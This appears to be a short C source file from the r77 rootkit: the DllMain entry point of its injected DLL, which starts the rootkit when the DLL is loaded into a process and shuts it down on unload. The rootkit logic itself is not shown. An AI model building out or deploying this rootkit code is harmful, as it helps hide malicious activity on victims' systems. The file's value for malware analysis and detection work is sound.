#include "r77mindef.h"
#include "Rootkit.h"
#include "ReflectiveDllMain.h"

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		if (!InitializeRootkit())
		{
			// If the rootkit could not initialize, is already injected, or not eligible for this process, detach the DLL.
			return FALSE;
		}
	}
	else if (reason == DLL_PROCESS_DETACH)
	{
		UninitializeRootkit();
	}

	return TRUE;
}